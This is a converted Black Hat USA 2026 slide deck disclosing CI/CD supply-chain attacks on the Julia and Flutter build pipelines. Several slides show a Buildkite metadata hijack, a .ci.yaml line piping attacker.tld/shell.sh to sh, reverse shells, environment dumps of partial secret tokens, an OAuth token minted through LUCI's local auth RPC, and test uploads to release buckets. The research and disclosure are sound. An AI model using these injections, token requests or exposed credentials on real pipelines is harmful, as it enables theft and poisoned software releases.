---
title: "Born Corrupted How We Backdoored Trusted Language Binaries"
speakers: ["Splitline Ng"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Splitline Ng_Born Corrupted How We Backdoored Trusted Language Binaries.pdf"
pages: 174
sha256: "650f71794f9f75a72c0a9da640c72eb71767d40fe51c4fd869a1b83e46c875a8"
text_chars: 52112
ocr_pages: 34
has_ocr: true
redacted_secrets: 0
ocr_confidence: 86.8
ocr_unreliable_blocks: 2
vision_unreviewed_pages: 0
vision_verified_pages_changed: 141
vision_verified_pages: 174
ocr_timeouts: 0
pages_recovered_from_text_layer: 3
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:46:07Z"
---
# Born Corrupted How We Backdoored Trusted Language Binaries

**Speakers:** Splitline Ng  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Splitline Ng_Born Corrupted How We Backdoored Trusted Language Binaries.pdf` (174 pages)


## Slide 1

## **Born Corrupted How We Backdoored Trusted Language Binaries**

Tsi-Lin ( **splitline** ) Ng

## Slide 2

You write Python.

## Slide 3

You install packages with pip.

## Slide 4

You audit every package you use.

## Slide 5

But,

## Slide 6

What if,

## Slide 7

What if, You're compromised

before the very first pip install?

## Slide 8

$ whois **splitline**.tw

Security Researcher @ DE✓CORE

Member of UNDEFINED Conclave

Average Web Hacking Enjoyer

Ng Tsi-Lin

## Slide 9

Supply Chain Attack

## Slide 10

```text
axios / axios

Code   Issues 47   Pull requests 19   Agents   Discussions   Actions   Security and quality 39   Insights

axios@1.14.1 and axios@0.30.4 are compromised #10604
Closed

ashishkurmi opened on Mar 30                    Last edited by ashishkurmi

more details: https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan

Most likely, a maintainer's GitHub and npm accounts are compromised as these issues are getting deleted.

I have also reported this as a vulnerability, so that a CVE can be generated.

👍 702   😄 9   😕 110   ❤️ 55   🚀 51   👀 180
```

## Slide 11

```text
axios / axios

Code   Issues 47   Pull

axios@1.14

Closed

ashishkurmi ope

more details: https://

Most likely, a mainta

I have also reported

👍 702   😄 9   😕

RESEARCH

Mini Shai-Hulud Hits @antv Ecosystem, 639 Compromised npm Package Versions

Active npm supply chain attack compromises @antv packages in a fast-moving malicious publish wave tied to Mini Shai-Hulud.

Socket Research Team

May 19, 2026 / 5 min read

echarts-for-react
Apache Echarts components for React.
latest   Source   npm   Copy purl   Socket 0

0% Supply Chain Security   100 Vulnerability   100 Quality   82 Maintenance   100 License
```

## Slide 12

```text
TrapDoor Supply Chain Attack Spreads Credential-Stealing Malware via
npm, PyPI, and CratesIO

Ravie Lakshmanan   May 25, 2026                                    Supply Chain Attack / Malware

⚡ Top Stories This Week

New Bit2Watt Attack Could Let Cloud Tenants Disrupt Power Grids Without an Exploit

Open-Source Android AI Agents Could Let Invisible Screen Text Run Code on Host PCs

Hacker Runs Hermes AI Agent Unattended for Post-Exploitation at Thai Finance Ministry

Critical SharePoint RCE CVE-2026-50522 Under Active Exploitation After Public PoC

Microsoft Azure DevOps MCP Flaw Lets Hidden PR Comments Hijack AI Review Agents

Researcher Publishes GitLab RCE PoC Letting Authenticated Users Run Commands as Git

Adobe Acrobat Extension Flaw Let

A new coordinated cross-ecosystem software supply chain attack campaign has targeted npm, PyPI, and Crates.io to distribute credential-stealing malware.

The campaign, codenamed TrapDoor, spans more than 34 malicious packages across over 384

👍 702   😄 9   😕

echarts-for-react
Apache Echarts components for React.
latest   Source   npm   Copy purl   Socket 0

0% Supply Chain Security   100 Vulnerability   100 Quality   82 Maintenance   100 License
```

## Slide 13

```text
TrapDoor Supply Chain Attack Spreads Credential-Stealing Malware via
npm, PyPI, and CratesIO

Ravie Lakshmanan   May 25, 2026                              Supply Chain Attack / Malware

⚡ Top Stories This Week

RHSB-2026-006 Supply chain compromise of @redhat-cloud-services npm packages

Created Date: June 1, 2026 at 03:50 PM
Updated July 2, 2026 at 08:38 AM

Resolved
Status

PAGE NAVIGATION

Executive Summary
Technical Summary

Executive Summary

We have completed our investigation into the compromise that we disclosed on June 1, 2026. Our findings identified that on May 29, 2026, a GitHub account, compromised via a VS code extension containing malware, was used to inject malicious code into packages maintained in a Red Hat GitHub organization and altered configuration files to infect other developers opening those directories. The compromised VS code extension was contained on June 1, 2026.
```

## Slide 14

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 15

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 16

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 17

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 18

Package Developer
Upload
Package Registry
PyPI, npm, RubyGems, Nuget...
Compromise
requests
Newtonsoft.Json
express.js
Poision
RIP

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

Hack the Source of the Source / BH Asia 2026

## Slide 19

Package Registry
Upload
What's Behind
All of These?
Poision
RIP

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

Hack the Source of the Source / BH Asia 2026

## Slide 20

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 21

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 22

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 23

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
④ ③ ① ②
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core
Agenda :)

## Slide 24

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
How?
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 25

Born Corrupted How We Backdoored ~~Trusted Language Binaries~~

Tsi-Lin (splitline) Ng

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
How?
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 26

Born Corrupted How We Backdoored

whatever software or package or stuffs

Tsi-Lin (splitline) Ng

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
How?
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 27

CI/CD Risks

Developer Dashboard

Developers Themself

???

Attack Surfaces

## Slide 28

CI/CD Risks

Developer Dashboard

~~Developers Themself~~

???

Attack Surfaces

## Slide 29

CI/CD Risks

Developer Dashboard

???

Attack Surfaces

## Slide 30

CI/CD Risks

Web Hacking

Developer Dashboard

???

Attack Surfaces

## Slide 31

Insuff. Flow Control

CI/CD Risks

Access Control

Poisoned Pipeline

Web Hacking

Developer Dashboard

???

Attack Surfaces

## Slide 32

Insuff. Flow Control

CI/CD Risks

Access Control

Poisoned Pipeline

Web Hacking

Developer Dashboard

???

Let's Think!

Attack Surfaces

## Slide 33

julia 1

## Slide 34

```text
JuliaLang / julia

Code   Issues 3.7k   Pull requests 977   Agents   Discussions   Actions   More

Filters   is:pr is:open   Labels 181   Milestones 5   New pull request

976 Open   33,525 Closed

Author   Label   Projects   Milestones   Reviews   Assignee

Open a Pull Request
```

## Slide 35

Takeover What You Download!

```text
julia
Download   Docs   Learn   Blog   Community

Current Stable Rele

v1.12.6 (April 9, 2026)
Release notes | GitHub tag | SHA256 Checksums

Platform                       -bit
Windows [help]                 aller, portable
macOS (Apple Silicon) [help]   .dmg, .tar.gz
macOS (Intel x86) [help]       .dmg, .tar.gz

https://julialang-s3.julialang.org/bin/mac/aarch64/1.12/julia-1.12.6-macaarch64.dmg

976 Op
Autho
```

## Slide 36

```text
Code  Is

julia
Download   Docs   Learn   Blog   Community

Current Stable Rele

v1.12.6 (April 9, 2026)
Release notes | GitHub tag | SHA256 Checksums

Takeover What You Download!

macOS (Apple Silicon) [help]   .dmg, .tar.gz
macOS (Intel x86) [help]       .dmg, .tar.gz

https://julialang-s3.julialang.org/bin/mac/aarch6

https://julialang-s3.julialang.org/bin/mac/aarch64/1.12/julia-1.12.6-macaarch64.dmg
```

## Slide 37

CI/CD

## Slide 38

Job#1
Job#2
Job#3
…

#### Job Worker

## Slide 39

Job#1
Job#2
Job#3
…

#### Job Worker

## Slide 40

Job#1
Job#2
Job#3
…

/secrets/agent.key

#### Job Worker

## Slide 41

Job#1
Job#2
Job#3
…

/secrets/agent.key

Privileged   Normal

env[KEY]=SECRET   (unmount)

/// RUN PIPELINE ///

Job Worker

## Slide 42

Job#1
Job#2
Job#3
…

/secrets/agent.key

① Compromise

② Cross Job

Privileged   Normal

env[KEY]=SECRET   (unmount)

/// RUN PIPELINE ///

Job Worker

## Slide 43

Job#1
Job#2
Job#3
…

/secrets/agent.key

① Compromise

② Cross Job

Privileged   Normal

env[KEY]=SECRET   (unmount)

/// RUN PIPELINE ///

Job Worker

## Slide 44

Pull Request

0_webui.yml **meta-data** set

REPO_URL= JuliaCI/julia-buildkite VERSION = <HEAD>

## Slide 45

Pull Request

0_webui.yml **meta-data** set REPO_URL= JuliaCI/julia-buildkite VERSION = <HEAD>

$ git clone <FORK>/julia $ make build build_x86_64-linux-gnu

## Slide 46

Pull Request

0_webui.yml **meta-data** set
REPO_URL= JuliaCI/julia-buildkite
VERSION = <HEAD>

$ git clone <FORK>/julia
$ make build
build_x86_64-linux-gnu

launch_signed_jobs
Privileged
REPO_URL,VERSION = get_meta()
git clone $REPO_URL
.buildkite/…/upload_julia.sh
upload_x86_64-linux-gnu

## Slide 47

Pull Request

0_webui.yml **meta-data** set
REPO_URL= JuliaCI/julia-buildkite
VERSION = <HEAD>

$ git clone <FORK>/julia
$ make build
build_x86_64-linux-gnu

Depends On

launch_signed_jobs
Privileged
REPO_URL,VERSION = get_meta()
git clone $REPO_URL
.buildkite/…/upload_julia.sh
upload_x86_64-linux-gnu

## Slide 48

Pull Request

0_webui.yml **meta-data** set
REPO_URL= JuliaCI/julia-buildkite
VERSION = <HEAD>

$ git clone <FORK>/julia
$ make build

Arbitrary Execution!

build_x86_64-linux-gnu

launch_signed_jobs
Privileged
REPO_URL,VERSION = get_meta()
git clone $REPO_URL
.buildkite/…/upload_julia.sh
upload_x86_64-linux-gnu

## Slide 49

Pull Request

0_webui.yml **meta-data** set
REPO_URL= JuliaCI/julia-buildkite
VERSION = <HEAD>

$ git clone ATTACKER/julia
$ make build

@buildkite-agent meta-data set REPO_URL "ATTACKER/julia-buildkite"
@buildkite-agent meta-data set VERSION "main"

</> Makefile

build_x86_64-linux-gnu

launch_signed_jobs
Privileged
REPO_URL,VERSION = get_meta()
git clone $REPO_URL
.buildkite/…/upload_julia.sh
upload_x86_64-linux-gnu

## Slide 50

Pull Request

0_webui.yml **meta-data** set  ATTACKER/julia-buildkite
REPO_URL= ~~JuliaCI/julia-buildkite~~
VERSION = <HEAD>

$ git clone ATTACKER/julia
$ make build
build_x86_64-linux-gnu

launch_signed_jobs
Privileged
REPO_URL,VERSION = get_meta()
git clone $REPO_URL
.buildkite/…/upload_julia.sh
upload_x86_64-linux-gnu

## Slide 51

Pull Request

0_webui.yml **meta-data** set  **ATTACKER/julia-buildkite**
REPO_URL= ~~JuliaCI/julia-buildkite~~
VERSION = <HEAD>

$ git clone <FORK>/julia
$ make build
build_x86_64-linux-gnu

Depends On

launch_signed_jobs
Privileged
REPO_URL,VERSION = get_meta()
git clone $REPO_URL
.buildkite/…/upload_julia.sh
upload_x86_64-linux-gnu

## Slide 52

Pull Request

0_webui.yml **meta-data** set  **ATTACKER/julia-buildkite**
REPO_URL= ~~JuliaCI/julia-buildkite~~
VERSION = <HEAD>

$ git clone <FORK>/julia
$ make build
build_x86_64-linux-gnu

Depends On

launch_signed_jobs
Privileged
REPO_URL,VERSION = get_meta()
git clone $REPO_URL
.buildkite/…/upload_julia.sh
Malicious!
upload_x86_64-linux-gnu

## Slide 53

```text
test: pre-build step for Buildkite metadata #62072

Some checks haven't completed yet
6 pending, 3 successful checks

9 checks

Build   Waiting for status to be reported — Started...
buildkite/julia-master   Waiting for status to be reported — Build #57973 started
Check   Waiting for status to be reported — Started...
JuliaC   Waiting for status to be reported — Started...
JuliaSyntax   Waiting for status to be reported — Started...
Labels / Check for blocking labels (pull_request)   Successful in 4s
Test   Waiting for status to be reported

31  +     -@buildkite-agent meta-data set
    BUILDKITE_PLUGIN_EXTERNAL_BUILDKITE_VERSION  "main"
```

## Slide 54

```text
test: pre-buil

~ rlwrap ncat -klvp 7414
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::7414
Ncat: Listening on 0.0.0.0:7414
Ncat: Connection from 128.30.92.138.
Ncat: Connection from 128.30.92.138:48800.
# Ncat: Connection from 128.30.92.137.
Ncat: Connection from 128.30.92.137:41112.
id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
env
BUILDKITE_PULL_REQUEST_LABELS=
BUILDKITE_CANCEL_GRACE_PERIOD=300
BUILDKITE_GIT_FETCH_FLAGS=-v --prune --tags
BUILDKITE_AGENT_META_DATA_CRYPTIC_CAPABLE=true
BUILDKITE_BUILD_CHECKOUT_PATH=/cache/build/tester-amdci5-10/julialang/julia-master
BUILDKITE_ADDITIONAL_HOOKS_PATHS=
FORCE_SANDBOX_MODE=unprivileged

Check for blocking labels (pull_request)   Successful in 4s
Test   Waiting for status to be reported

31  +     -@buildkite-agent meta-data set
    BUILDKITE_PLUGIN_EXTERNAL_BUILDKITE_VERSION  "main"
```

## Slide 55

```text
Linux amdci5.julia.csail.mit.edu
Linux amdci4.julia.csail.mit.edu 5.15.0-184-generic #194-Ubuntu SMP Mon

env | grep -E '(SECRET|TOKEN)='
BUILDKITE_PLUGIN_CRYPTIC_BASE64_SIGNED_JOB_ID_SECRET=Z6OaqbiPaa0RK/E5
RG3cxUVTx1MJ3rPBZDVEGIEuAuFUz7dRHK7EFtUFf+E7crhCMPO9uDhKtWJDoIsNywPv+
DJh8uXhXJWHwrr1Bkv7Ur6nYFAX8DuhJEzSvjY6NUgnvTNmRRR0BkQm9GmIpvOP0ERKZz
BUILDKITE_AGENT_JOB_API_TOKEN=CO2E6q9DbzXsvW70GqGIxITo6ukkEEtY0mV5X2f
F0WHNKMzFGbTFKN29IYzlveGZaWQpKY3FxRk5yaXRMUUhxaDVJUHNGS3YySis1K1FVQkZ
BUILDKITE_PLUGIN_CRYPTIC_BASE64_AGENT_PUBLIC_KEY_SECRET=LS0tLS1CRUdJT
QUVZWWNTZGdvTGt4YWpWNy9rb0hFTDgrczRKdFRVNUJ6d1RFdXAKTllTZGNQOFhQSmJLe
VxMUZFb0N2MDRyaTFXaWpVZXorMytEWVM4UCtROGRxMGJYUWZUS1Vyc0thMkdnLzVmZ0h
UW5QNDZVLzEKZFFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
BUILDKITE_PLUGIN_CRYPTIC_BASE64_AGENT_PRIVATE_KEY_SECRET=LS0tLS1CRUdJ
FlTOFArUThkcTBiWFFmVEtVcnNLYTJHZy81ZmdIeWdEdWRHT2ZsdzUvVEljR3VVbGNsd1
0dOMkhtK3E5elBlSHAxd3pIZU5aZ29BR0htM3RyUU0KMGpidUczN09OSG1YdGQ1MEYyVH
1eDVSMHNIdDFoU2FvTXBFbSsrMWc1V09rSzZDTGFJbEV0ZitWVVBvR0piYlNYRzNJCmo5
0wKQSsvVFdCbUJBb0dCQU52cXRPQjRuVS9zODIxTU9alRPTmtFOGNJOENxV1BRTZXcE
HFISy9SV2dVK3ZZaitwZy9ibXBwMmdiUXZkYTJxaS84UEl2OApSb0JwcmY2Y285TmdSaZ
mxYMVZnWQpYUjAXcyUmpmS09TbElYZFlITjZwOUZBb0dCQUp0NXdwMkVPRXR5VE9NZnVn
USVF4SHZBaE1rSDJvMVZaSGxCY25oMVEKdjV3QTbhRkVGVkNuczU4QVNEVjMwd2d0VlBx
1I4RmxWNHc4OUF5R3NuVnNnUDJ1RWtxTEI1UTRUcTZnVDBLakVETE51CjRobEhvOGFsQW
0Uisxd2xpWkQwZGJnRGdVeVRMcnN5Y1RDSkZIczNIZTFXb3NCSzcxTmlncFZhWEVzWnFp
EdnPQotLS0tLUVORCBSU0EgUEJJVkFURSBLRVktLS0tLQo=
BUILDKITE_AGENT_ACCESS_TOKEN=bkaj_eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIwMT
tODM3Yy01MjBjM2M4YmFiMDMiLCJpc3MiOiJidWlsZGtpdGUiLCJleHAiOiF...

Test   Waiting for status to be reported

31  +     -@buildkite-agent meta-data set
    BUILDKITE_PLUGIN_EXTERNAL_BUILDKITE_VERSION  "main"
```

## Slide 56

```text
test: pre-buil

~ rlwrap ncat -klvp 7414
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::7414
Linux amdci5.julia.csail.mit.edu
Linux amdci4.julia.csail.mit.edu 5.15.0-184-generic #194-Ubuntu SMP M
env | grep -E '(SECRET|TOKEN)='
BUILDKITE_PLUGIN_CRYPTIC_BASE64_SIGNED_JOB_ID_SECRET=Z6OaqbiPaa0RK/E5

← → ⟳   https://julialang-s3.julialang.org/bin/linux/x64/1.12/pwned.txt

pwned

...0Uisxd2xpWkQwZGJnRGdVeVRMcnN5Y1RDSkZIczNIZTFXb3NCSzcxTmlncFZhWEVzWnFp
EdnPQotLS0tLUVORCBSU0EgUEJJVkFURSBLRVktLS0tLQo=
BUILDKITE_AGENT_ACCESS_TOKEN=bkaj_eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIwMT
tODM3Yy01MjBjM2M4YmFiMDMiLCJpc3MiOiJidWlsZGtpdGUiLCJleHAiOiF...

Test   Waiting for status to be reported

31  +     -@buildkite-agent meta-data set
    BUILDKITE_PLUGIN_EXTERNAL_BUILDKITE_VERSION  "main"
```

## Slide 57

julia Hacked 1

## Slide 58

Flutter 2

## Slide 59

```text
flutter / flutter

Code   Issues 5k+   Pull requests 518   Agents   Actions   Projects   Wi   More

Filters   is:pr is:open   Labels 492   Milestones 9   New pull request

518 Open   72,681 Closed

Author   Label   Projects   Milestones   Reviews   Assignee   Sort

From Opening a PR
```

## Slide 60

```text
flutter / flutter

Code   Issues 5k+   Pull requests

Filters   is:pr is:open

518 Open   72,681 Closed

Author   Label   Projects   Milestones   Assignee   Sort

Install manually
Install with VS Code
SDK archive
Upgrade SDK
Add to path
Troubleshoot
Uninstall SDK
Resources

Install and set up Flutter

To install the Flutter SDK, download the latest stored.

1   Download the Flutter SDK bundle
Download the following installation bundle

flutter_windows_3.44.8-stable.zip

2   Create a folder to store the SDK

https://storage.googleapis.com/flutter_infra_release/releases/stable/windows_3.44.8-stable.zip

Takeover What You Download!
```

## Slide 61

CI/CD

## Slide 62

In Google OSS Infra

CI/CD

## Slide 63

Gerrit

CV
Change Verifier

lucicfg / *.star

Buildbucket

schedule task

Recipe (CI Steps)
1. checkout
2. compile
3. test
4. upload result

Swarming

Bot   Bot   Bot

CIPD
runtimes/tools

Task workspace on Bot

Agent   compile/test/…

CAS
Build/task artifact

Local Auth RPC

## Slide 64

Job#1
Job#2
Job#3
…
secrets / token

#### Job Worker

## Slide 65

Job#1
Job#2
Job#3
…

LUCI
Layered Universal Continuous Integration

secrets / token

Job Worker

## Slide 66

##### Google Cloud Platform

Prod Task
Job#1
Job#2
Job#3
…

Try Task
Job#1
Job#2
Job#3
…

LUCI_CONTEXT
Based on task type

Bot
Job Worker

## Slide 67

##### Google Cloud Platform

Prod Task
Job#1
Job#2
Job#3
…

Try Task
Job#1
Job#2
Job#3
…

Local Auth RPC
Auth   Service Account
LUCI_CONTEXT
Based on task type

Bot
Job Worker

## Slide 68

##### Google Cloud Platform

Prod Task
Job#1
Job#2
Job#3
…

Cross Task

Try Task
Job#1
Job#2
Job#3
…

Local Auth RPC
Auth   Service Account
LUCI_CONTEXT
Based on task type

Bot
Job Worker

## Slide 69

##### Google Cloud Platform

Prod Task
Job#1
Job#2
Job#3
…

Cross Task

(Something Shared)

Try Task
Job#1
Job#2
Job#3
…

Local Auth RPC
Auth   Service Account
LUCI_CONTEXT
Based on task type

Bot
Job Worker

## Slide 70

##### Google Cloud Platform

Prod Task
Job#1
Job#2
Job#3
…

Cross Task

(Something Shared)

Try Task
Job#1
Job#2
Job#3
…

Local Auth RPC
Auth   Service Account
LUCI_CONTEXT
Based on task type

Bot
Job Worker

## Slide 71

final content = await githubFileContent( slug, ciYamlPath, // ".ci.yaml" ref: commitSha, // <- fork's SHA: to attacker's file );

## Slide 72

```yaml
- name: Linux framework_tests_libraries
  recipe: flutter/flutter_drone
  timeout: 60
  properties:
    # ...
    tags: >
      ["framework","hostonly","shard", "linux"]
+   env_variables: >-
+     {
+       "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)"
+     }
+   contexts: >-
+     ["metric_center_token"]
  runIf:
    - dev/**
    - packages/flutter/**
  # ...
```

final content = await githubFileContent(
    slug,
    ciYamlPath,      // ".ci.yaml"
    ref: commitSha,   // <- fork's SHA: to attacker's file
);

## Slide 73

```yaml
- name: Linux framework_tests_libraries
  recipe: flutter/flutter_drone
  timeout: 60
  properties:
    # ...
    tags: >
      ["framework","hostonly","shard", "linux"]
+   env_variables: >-
+     {
+       "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)"
+     }
+   contexts: >-
+     ["metric_center_token"]
  runIf:
    - dev/**
    - packages/flutter/**
  # ...
```

final content = await githubFileContent(
    slug,
    ciYamlPath,      // ".ci.yaml"
    ref: commitSha,   // <- fork's SHA: to attacker's file
);

Open PR!

## Slide 74

```yaml
- name: Linux framework_tests_libraries
  recipe: flutter/flutter_drone
  timeout: 60
  properties:
    # ...
    tags: >
      ["framework","hostonly","shard", "linux"]
+   env_variables: >-
+     {
+       "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)"
+     }
+   contexts: >-
+     ["metric_center_token"]
  runIf:
    - dev/**
    - packages/flutter/**
  # ...
```

final content = await githubFileContent(
    slug,
    ciYamlPath,      // ".ci.yaml"
    ref: commitSha,   // <- fork's SHA: to attacker's file
);

How to avoid getting closed?

Open PR!

## Slide 75

```text
- name: Linux framework_tests_libraries

512 Open   72,674 Closed                              Author   La

[Impeller] Skip binding dead-code-eliminated resources on Metal   e: impeller   engine
#190040 opened 43 minutes ago by bdero   Member · Draft   7 of 8 tasks

Roll Skia from 62442d6cf0ec to c3b29df302dd (1 revision)   autosubmit   CICD   engi
#190038 opened 1 hour ago by engine-flutter-autoroll   Contributor · Approved

[Flutter GPU] Add 2D texture array support   CICD   e: impeller   engine   flutter-gpu   te
#190036 opened 3 hours ago by bdero   Member · Review required   8 tasks done

Roll Skia from 62442d6cf0ec to c3b29df302dd (1 revision)   CICD   engine
#190033 by engine-flutter-autoroll   Contributor   was closed 1 hour ago · Approved

Roll Skia from 62442d6cf0ec to c3b29df302dd (1 revision)   CICD   e
#190032 by engine-flutter-autoroll   Contributor   was closed 5 hours ago · Approved

f
);
# ...
```

## Slide 76

```text
- name: Linux framework_tests_libraries

512 Open   72,674 Closed                              Author   La

[Impeller] Skip binding dead-code-eliminated resources on Metal   e: impeller   engine
#190040 opened 43 minutes ago by bdero   Member · Draft   7 of 8 tasks

Roll Skia from 62442d6cf0ec to c3b29df302dd (1 revision)   autosubmit   CICD   engi
#190038 opened 1 hour ago by engine-flutter-autoroll   Contributor · Approved

[Flutter GPU] Add 2D texture array support   CICD   e: impeller   engine   flutter-gpu   te
#190036 opened 3 hours ago by bdero   Member · Review required   8 tasks done

Roll Skia from 62442d6cf0ec to c3b29df302dd (1 revision)   CICD   engine
#190033 by engine-flutter-autoroll   Contributor   was closed 1 hour ago · Approved

Roll Skia from 62442d6cf0ec to c3b29df302dd (1 revision)   CICD   e
#190032 by engine-flutter-autoroll   Contributor   was closed 5 hours ago · Approved

f
);
# ...
```

## Slide 77

```text
Roll Skia from f886711f9453 to fe9e9f229487 (4 revisions) #18

Closed   0Eniltilps wants to merge 2 commits into flutter:master from 0Eniltilps:patch-1

Conversation 0   Commits 2   Checks 151   Files changed 1

0Eniltilps commented on Mar 5

Replace this paragraph with a description of what this PR is changing or adding, and why. Consider including before/after screenshots.

List which issues are fixed by this PR. You must list at least one issue. An issue is not required if the PR fixes something trivial like a typo.

If you had to change anything in the flutter/tests repo, include a link to the migration guide and breaking change policy.
```

## Slide 78

final content = await githubFileContent(
    slug,
    ciYamlPath,      // ".ci.yaml"
    ref: commitSha,   // <- fork's SHA: to attacker's file
);

```text
rlwrap (ssh)

id
uid=1000(chrome-bot) gid=1000(chrome-bot) groups=1000(chrome-bot),109(kvm)
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1460 qdisc mq state UP group default qlen 1000
    link/ether 42:01:0a:80:00:49 brd ff:ff:ff:ff:ff:ff
    inet 10.128.0.73/32 metric 100 scope global dynamic ens4
       valid_lft 3264sec preferred_lft 3264sec
    inet6 fe80::4001:aff:fe80:49/64 scope link
       valid_lft forever preferred_lft forever
ps
    PID TTY          TIME CMD
   1084 ?        00:00:14 python3
  73742 ?        00:00:00 systemd
  73744 ?        00:00:00 (sd-pam)
  73750 ?        00:00:00 chromebuild-sta
  74714 ?        00:00:04 python3
```

Reverse Shell!

## Slide 79

```text
rlwrap (ssh)

id
uid=1000(chrome-bot) gid=1000(chrome-bot) groups=1000(chrome-bot),109(kvm)
curl -s -X POST \
    -H "Content-Type: application/json" \
    -d "{
      \"scopes\": [
        \"https://www.googleapis.com/auth/cloud-platform\",
        \"https://www.googleapis.com/auth/datastore\"
      ],
      \"secret\": \"ik/ORYUTeygi5+wB8g1/niL91PxVgQP84zDmtTUG726M7NcfdzDMVeRGXXlVmSXU\",
      \"account_id\": \"task\"
    }" \
    "http://127.0.0.1:39979/rpc/LuciLocalAuthService.GetOAuthToken"
> > > > > > > > {"access_token": "ya29.c.c0AZ4bNpYTYqVltK7v0ptso3kZLMZHoLsm68xNM0Yg9pzhJAKvcgzYZ-HBJr2hMlv0f0cIK-uEre0yNjV3Tj-ONPLgKBhrpOn2aAixKeACzXpI6zA7VtrT70oek5FX14hGPw6FsIDXKIaVovPbQBOQJssbGeXL4ZxwtE2GPuglgPJw6ZY8LecV1vHqEOd6n81ew5XWi-F0Jg9I3pd2sYFnHRCben-NV8uaXbXgsZgIaNjqLew_JB4PCH4DUx_0Kpr1aFQWqFOkC5nHZsYWAK1MQ2CRoGJbNQ0S5KuKyE2_S2ON-daOQqJv7juTiSRny5RUqvo3P95bO4e07P6LXmjN_UVFrQyk_t2VZ7wrDG_IJmOZJhj0_IjZAsXGXkriaRVdmaVHL4nP33EhRWWtT_E9XPUHOcY46K855NH_OY7iwkmkjbyPM5phMJyAbT_n7U1WnLPQ0IcPcID_tRgU628gJLXuTrmlO8C9OKV4AW6VONKEaO0rDY1xwnxyI9OpZuGA4AmIiz66i2EthujjJUFys7f84079As2A1Rr5LkNApzmo_af7P-iazlXYk-W3fFrZlwbby37vJjSHMLnYNKDCFGDjQVl4GONyWCeQWiIkeSRsMn0bu6YgTgL639P_ye5lrkRwvt5qFz-Vvg-3Ss2Y6fh8wq_JBjFu1i7WJec2QUhUVlXfzfBVrnVoqZV0t17fsujQpm4jfkafZ1ZOymsj_decmoy0Zk-M3oSphUstfZy-q7nbe27Uedx11t1aZ2zz7YWs3zvk4l_koewY6fyZ-3fFayas1kqRSx4p27Il3VBpFB072fwFmt-aoxqd8Vjiq4fYs1O3RQ2UpWZ6vtY_sSqYfybq56JhzMjhxiRiI3u_mf6BWSrr91ytaY_1M4Z3Venzs5ffZcpghMvM653gjbsnZ7M9Sl_Fp_Jnele_J_oVcsw2rn-499wcd9_YkitmY7mVXMQ7tlWMOBnt-F_wbch1FjSqUf1OFmxsJR7QM3k4ovl6aogJju1", "expiry": 1772716104}
```

## Slide 80

```text
~ curl -sS -X POST \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: text/plain" \
    --data 'pwned' \
    "https://storage.googleapis.com/upload/storage/v1/b/flutter_archives_v2/o?uploadTy
t"

{
  "kind": "storage#object",
  "id": "flutter_archives_v2/download.flutter.io/io/pwned.txt/1772713469572856",
  "selfLink": "https://www.googleapis.com/storage/v1/b/flutter_archives_v2/o/downloa
  "mediaLink": "https://storage.googleapis.com/download/storage/v1/b/flutter_archive
eneration=1772713469572856&alt=media",
  "name": "download.flutter.io/io/pwned.txt",
  "bucket": "flutter_archives_v2",
  "generation": "1772713469572856",
  "metageneration": "1",
